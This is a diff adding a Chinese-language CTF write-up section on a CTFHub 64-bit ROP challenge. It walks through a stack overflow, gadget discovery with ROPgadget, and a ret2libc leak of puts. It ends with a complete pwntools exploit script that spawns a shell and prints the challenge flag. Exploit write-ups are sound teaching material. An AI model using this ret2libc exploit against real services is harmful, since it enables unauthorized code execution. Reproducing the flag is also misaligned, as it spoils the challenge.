@@ -379,6 +379,112 @@ io.interactive()
 
 ------
 
+### ROP
+
+先`file ./pwn`查看文件类型再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/ROP]
+└─$ file ./pwn
+./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f5d131f24a3b86fc859f2cfade17eb92888ff738, not stripped
+                                                                                                      
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/ROP]
+└─$ checksec --file=./pwn
+[*] '/home/tyd/ctf/pwn/ctfhub/ROP/pwn'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  FILE *v3; // rdi
+
+  puts("Welcome to CTFHub rop.Input someting:\n");
+  v3 = _bss_start;
+  fflush(_bss_start);
+  vulnerable_function(v3);
+  return 0;
+}
+```
+
+双击`vulnerable_function()`函数查看详情，`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`64`字节，而`read()`函数限制输入`0x200`个字节，显然存在栈溢出漏洞。构造`payload`时可以先用`0x40`个字节占满`buf`变量，再用`0x8`个字节覆盖到`$rbp`。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  return read(0, buf, 0x200uLL);
+}
+```
+
+此外，该程序没有发现直接调用`system("/bin/sh")`的后门函数。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400683`，`ret`的地址是`0x40048e`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/ROP]
+└─$ ROPgadget --binary ./pwn --only "pop|ret"
+Gadgets information
+============================================================
+0x000000000040067c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040067e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400680 : pop r14 ; pop r15 ; ret
+0x0000000000400682 : pop r15 ; ret
+0x000000000040067b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040067f : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400538 : pop rbp ; ret
+0x0000000000400683 : pop rdi ; ret
+0x0000000000400681 : pop rsi ; pop r15 ; ret
+0x000000000040067d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040048e : ret
+
+Unique gadgets found: 11
+```
+
+该程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并利用`puts()`函数泄露`puts()`函数在`got`表中的真实地址，利用题目给出的`libc-2.27.so`可以算出`libc`的基地址，进而求得`system()`和`/bin/sh`的地址。如果题目没有给出`libc`文件，我们可以使用`LibcSearcher`尝试求解`libc`基地址，选用的`Libc`为`libc6_2.27-0ubuntu3_amd64`，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`ctfhub{886c5a56d6e9660ecc25656d}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('challenge-aa7fdc153a68545a.sandbox.ctfhub.com', 32528)
+elf = ELF('./pwn')
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = elf.sym['main']
+pop_rdi = 0x400683   # pop rdi; ret
+padding = cyclic(0x40+0x8)
+payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+io.recvline()
+io.sendline(payload)
+io.recvline()
+puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
+log.success('puts_addr => %#x', puts_addr)
+ret = 0x40048e  # ret
+libc = ELF('./libc-2.27.so')
+offset = {'puts': libc.sym['puts'], 'system': libc.sym['system'], 'sh': next(libc.search(b'/bin/sh'))}
+# from LibcSearcher import *
+# libc = LibcSearcher('puts', puts_addr)
+# offset = {'puts': libc.dump('puts'), 'system': libc.dump('system'), 'sh': libc.dump('str_bin_sh')}
+# Choose: libc6_2.27-0ubuntu3_amd64
+libcbase = puts_addr - offset['puts']
+log.success('libcbase_addr => %#x', libcbase)
+system_addr = libcbase + offset['system']
+log.success('system_addr => %#x', system_addr)
+bin_sh_addr = libcbase + offset['sh']
+log.success('bin_sh_addr => %#x', bin_sh_addr)
+shellcode = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+io.sendlineafter(b'\n', shellcode)
+io.interactive()
+```
+
+------
+
 ## BUUCTF
 
 ### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)
